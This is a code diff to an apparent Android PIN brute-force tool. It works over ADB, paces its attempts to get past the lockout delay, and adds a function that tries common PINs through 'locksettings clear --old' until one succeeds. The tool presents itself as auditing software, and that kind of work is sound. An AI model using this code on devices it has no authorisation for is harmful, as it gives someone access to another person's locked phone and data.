@@ -5,8 +5,9 @@ import sys
 
 
 digit_list = (
-    "1234", "1111", "2000", "1212", "7777", "1004", "0000", "4444", "2222", "6969",
+    "1234", "1111", "0000", "1212", "7777", "1004", "2000", "4444", "2222", "6969",
     "9999", "3333", "5555", "6666", "1122", "1313", "8888", "4321", "2001", "1010")
+
 
 def get_connected_devices():
     """Return all connected devices
@@ -109,9 +110,9 @@ def start_gui_bf(device):
         proc_count += 1
 
         if (proc_count % 5) == 0:
-           print("Waiting 30 secondes")
-           exec_command(device, "input keyevent 66")
-           time.sleep(30)
+            print("Waiting 30 secondes")
+            exec_command(device, "input keyevent 66")
+            time.sleep(30)
 
     # REAL BRUTE-FORCE
     for i in range(0, 10000):
@@ -133,3 +134,16 @@ def start_gui_bf(device):
             print("Waiting 30 secondes")
             time.sleep(30)
 
+
+def start_locksettings_bf(device):
+    """Launch LockSettings bruteforce
+
+    :param device: Device to audit
+    """
+    for pin in digit_list:
+        print("Try %s" % pin)
+        command_ret = exec_command(device, "locksettings clear --old %s" % pin)
+
+        if command_ret == "Lock credential cleared":
+            exec_command(device, "locksettings set-pin %s" % pin)
+            sys.exit("PIN identified: %s" % pin)
